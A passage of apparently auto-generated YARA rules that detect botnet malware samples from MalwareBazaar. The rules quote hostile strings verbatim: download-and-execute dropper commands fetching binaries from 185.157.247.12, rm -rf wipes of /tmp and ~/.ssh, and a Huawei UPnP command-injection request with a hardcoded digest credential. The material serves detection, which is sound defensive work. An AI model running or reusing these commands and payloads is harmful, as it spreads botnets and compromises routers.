      $s17 = "(wget http://185.157.247.12/ee/arc -O- || busybox wget http://185.157.247.12/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s18 = "(wget http://185.157.247.12/ee/armv7l -O- || busybox wget http://185.157.247.12/ee/armv7l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s19 = "(wget http://185.157.247.12/ee/armv4l -O- || busybox wget http://185.157.247.12/ee/armv4l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s20 = "(wget http://185.157.247.12/ee/mips -O- || busybox wget http://185.157.247.12/ee/mips -O-) > .f; chmod 777 .f; ./.f escan; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule a42cca9188e76c22c4bf78fb9821155323da79c3e2ad49be53ff3dc3ff074615 {
   meta:
      description = "evidences - file a42cca9188e76c22c4bf78fb9821155323da79c3e2ad49be53ff3dc3ff074615.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a42cca9188e76c22c4bf78fb9821155323da79c3e2ad49be53ff3dc3ff074615"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s2 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s3 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s4 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s5 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s6 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s7 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f xvr; > .f; #" ascii
      $s8 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s9 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s10 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s11 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s12 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s13 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s14 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s15 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s16 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s17 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s18 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s19 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f xvr; > .f; #" ascii
      $s20 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule bfb6514dba65e9a1113e45a17bd2d787542e48cf8e0ed64e8c2967bec91e10a4 {
   meta:
      description = "evidences - file bfb6514dba65e9a1113e45a17bd2d787542e48cf8e0ed64e8c2967bec91e10a4.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "bfb6514dba65e9a1113e45a17bd2d787542e48cf8e0ed64e8c2967bec91e10a4"
   strings:
      $s1 = "(wget http://185.157.247.12/tt/powerpc -O- || busybox wget http://185.157.247.12/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s2 = "(wget http://185.157.247.12/tt/sh4 -O- || busybox wget http://185.157.247.12/tt/sh4 -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s3 = "(wget http://185.157.247.12/tt/arc -O- || busybox wget http://185.157.247.12/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s4 = "(wget http://185.157.247.12/tt/arc -O- || busybox wget http://185.157.247.12/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s5 = "(wget http://185.157.247.12/tt/riscv32 -O- || busybox wget http://185.157.247.12/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s6 = "(wget http://185.157.247.12/tt/armv7l -O- || busybox wget http://185.157.247.12/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s7 = "(wget http://185.157.247.12/tt/powerpc -O- || busybox wget http://185.157.247.12/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s8 = "(wget http://185.157.247.12/tt/riscv32 -O- || busybox wget http://185.157.247.12/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
      $s9 = "(wget http://185.157.247.12/tt/armv7l -O- || busybox wget http://185.157.247.12/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s10 = "(wget http://185.157.247.12/tt/mipsel -O- || busybox wget http://185.157.247.12/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s11 = "(wget http://185.157.247.12/tt/armv6l -O- || busybox wget http://185.157.247.12/tt/armv6l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s12 = "(wget http://185.157.247.12/tt/armv5l -O- || busybox wget http://185.157.247.12/tt/armv5l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s13 = "(wget http://185.157.247.12/tt/mips -O- || busybox wget http://185.157.247.12/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
      $s14 = "(wget http://185.157.247.12/tt/armv4l -O- || busybox wget http://185.157.247.12/tt/armv4l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s15 = "(wget http://185.157.247.12/tt/sparc -O- || busybox wget http://185.157.247.12/tt/sparc -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s16 = "(wget http://185.157.247.12/tt/armv6l -O- || busybox wget http://185.157.247.12/tt/armv6l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s17 = "(wget http://185.157.247.12/tt/mipsel -O- || busybox wget http://185.157.247.12/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s18 = "(wget http://185.157.247.12/tt/armv4l -O- || busybox wget http://185.157.247.12/tt/armv4l -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s19 = "(wget http://185.157.247.12/tt/mips -O- || busybox wget http://185.157.247.12/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
      $s20 = "(wget http://185.157.247.12/tt/armv4eb -O- || busybox wget http://185.157.247.12/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f tscan;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule d52aac17b47d382cccbc70021f7bfd04e0942c938763069f4ce2d1275cf2627a {
   meta:
      description = "evidences - file d52aac17b47d382cccbc70021f7bfd04e0942c938763069f4ce2d1275cf2627a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "d52aac17b47d382cccbc70021f7bfd04e0942c938763069f4ce2d1275cf2627a"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s2 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s3 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s4 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s5 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s6 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s7 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s8 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s9 = "rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/sh" ascii
      $s10 = "rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -rf /tmp/* /tmp/.* /dev/shm/* /dev/sh" ascii
      $s11 = "m/.* /var/tmp/* /var/tmp/.* ~/.ssh/*;" fullword ascii
      $s12 = "f; # ; rm -rf .f;" fullword ascii
      $s13 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      8 of them
}

rule sig_5dfa1f0a22636bf2421116554bb4e3f3d82728643889f8326245a53be87e32ff {
   meta:
      description = "evidences - file 5dfa1f0a22636bf2421116554bb4e3f3d82728643889f8326245a53be87e32ff.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "5dfa1f0a22636bf2421116554bb4e3f3d82728643889f8326245a53be87e32ff"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/superh-O- || busybox wget http://185.157.247.12/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; " ascii
      $s2 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s3 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s4 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s5 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s6 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s7 = "(wget http://185.157.247.12/vv/superh-O- || busybox wget http://185.157.247.12/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; " ascii
      $s8 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s9 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s10 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s11 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s12 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s13 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s14 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s15 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s16 = "(wget http://185.157.247.12/vv/i686 -O- || busybox wget http://185.157.247.12/vv/i686 -O-) > .f; chmod 777 .f; ./.f ssh; > .f; #" ascii
      $s17 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s18 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s19 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s20 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61 {
   meta:
      description = "evidences - file 1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "User-Agent: wget (dlr)" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "/bin/busybox echo -ne " fullword ascii
      $s12 = "#GET /dlr." fullword ascii
      $s13 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s14 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s15 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s18 = "assword" fullword ascii
      $s19 = "sername" fullword ascii
      $s20 = "Error 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87 {
   meta:
      description = "evidences - file 4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "User-Agent: wget (dlr)" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "/bin/busybox echo -ne " fullword ascii
      $s12 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s13 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s14 = "GET /dlr." fullword ascii
      $s15 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s18 = "assword" fullword ascii
      $s19 = "sername" fullword ascii
      $s20 = "Error 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963 {
   meta:
      description = "evidences - file 5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "User-Agent: wget (dlr)" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "/bin/busybox echo -ne " fullword ascii
      $s12 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s13 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s14 = "GET /dlr." fullword ascii
      $s15 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s18 = "assword" fullword ascii
      $s19 = "sername" fullword ascii
      $s20 = "Error 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916 {
   meta:
      description = "evidences - file d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "User-Agent: wget (dlr)" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "/bin/busybox echo -ne " fullword ascii
      $s12 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s13 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s14 = "GET /dlr." fullword ascii
      $s15 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s18 = "assword" fullword ascii
      $s19 = "sername" fullword ascii
      $s20 = "Error 2" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72 {
   meta:
      description = "evidences - file 254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{3454CF84-2CCD-43A3-8A42-55EF28138F9E}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "V:\\H7)'" fullword ascii
      $s4 = "<Z:\"uQ`j" fullword ascii
      $s5 = ">UwF:\\" fullword ascii
      $s6 = "\\Xh]- " fullword ascii
      $s7 = "om\\.\\|" fullword ascii
      $s8 = "xylhs w" fullword ascii
      $s9 = "@Q<(!." fullword ascii
      $s10 = "vgbfcb" fullword ascii
      $s11 = "ibxnCtL8" fullword ascii
      $s12 = "-5U (* " fullword ascii
      $s13 = "%Y%79]" fullword ascii
      $s14 = "# l!2=" fullword ascii
      $s15 = "dA- ci" fullword ascii
      $s16 = "qxWZH34" fullword ascii
      $s17 = " -e1lv" fullword ascii
      $s18 = "# :)`g" fullword ascii
      $s19 = "(\\I+ K" fullword ascii
      $s20 = "qZBnsz3\\" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule a37c246bf8a6b29966fd7748721a232e55131007c9b51c7ff2ac4fafaa841247 {
   meta:
      description = "evidences - file a37c246bf8a6b29966fd7748721a232e55131007c9b51c7ff2ac4fafaa841247.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a37c246bf8a6b29966fd7748721a232e55131007c9b51c7ff2ac4fafaa841247"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s2 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s3 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s4 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s5 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s6 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s7 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s8 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s9 = "rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/" ascii
      $s10 = "rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/" ascii
      $s11 = ".* /var/tmp/* /var/tmp/.* ~/.ssh/*;" fullword ascii
      $s12 = "; # ; rm -rf .f;" fullword ascii
      $s13 = "> .f; # ; rm -rf .f;" fullword ascii
      $s14 = "./the_rizzler" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      8 of them
}

rule sig_2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477 {
   meta:
      description = "evidences - file 2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
